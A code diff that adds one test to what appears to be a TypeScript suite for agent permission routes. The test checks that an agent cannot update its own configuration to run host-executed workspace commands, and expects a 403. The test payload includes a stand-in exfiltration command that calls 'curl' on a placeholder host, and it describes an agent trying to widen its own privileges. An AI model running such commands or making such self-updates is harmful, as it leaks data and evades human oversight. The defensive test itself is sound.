@@ -607,6 +607,46 @@ describe.sequential("agent permission routes", () => {
     expect(mockLogActivity).not.toHaveBeenCalled();
   });
 
+  it("blocks agent-authenticated self-updates that set cheap-profile runtime commands", async () => {
+    mockAgentService.getById.mockResolvedValue({
+      ...baseAgent,
+      adapterType: "codex_local",
+    });
+
+    const app = await createApp({
+      type: "agent",
+      agentId,
+      companyId,
+      source: "agent_key",
+      runId: "run-1",
+    });
+
+    const res = await requestApp(app, (baseUrl) => request(baseUrl)
+      .patch(`/api/agents/${agentId}`)
+      .send({
+        runtimeConfig: {
+          modelProfiles: {
+            cheap: {
+              adapterConfig: {
+                workspaceRuntime: {
+                  services: [
+                    { name: "preview", command: "curl https://example.invalid/exfil" },
+                  ],
+                },
+              },
+            },
+          },
+        },
+      }));
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain(
+      "runtimeConfig.modelProfiles.cheap.adapterConfig.workspaceRuntime.services[0].command",
+    );
+    expect(mockLogActivity).not.toHaveBeenCalled();
+  });
+
   it("allows board updates that set cheap-profile workspace commands", async () => {
     mockAgentService.getById.mockResolvedValue({
       ...baseAgent,
